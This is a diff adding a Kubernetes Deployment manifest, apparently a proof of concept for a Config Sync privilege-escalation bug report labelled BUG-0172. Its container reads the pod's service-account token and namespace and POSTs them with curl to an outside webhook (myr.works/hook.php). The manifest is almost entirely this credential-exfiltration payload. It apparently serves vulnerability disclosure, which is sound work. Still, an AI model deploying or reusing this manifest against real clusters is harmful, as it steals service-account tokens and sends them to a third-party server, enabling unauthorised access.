@@ -1,0 +1,34 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: bug0172-exfil
+  namespace: default
+  labels:
+    app: bug0172-poc
+  annotations:
+    bug: "BUG-0172 (D-94602625) gkehub Config Sync two-plane privesc"
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: bug0172-exfil
+  template:
+    metadata:
+      labels:
+        app: bug0172-exfil
+    spec:
+      containers:
+      - name: exfil
+        image: curlimages/curl:latest
+        command:
+        - /bin/sh
+        - -c
+        - |
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          curl -s -X POST https://myr.works/hook.php \
+            -H "Content-Type: application/json" \
+            -H "X-Test-issue: fromgkehub" \
+            -d "{\"token\": \"$TOKEN\", \"source\": \"bug0172-gkehub-configsync\", \"sa\": \"$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\"}"
+          echo "Exfil sent. Sleeping."
+          sleep 3600
+      automountServiceAccountToken: true
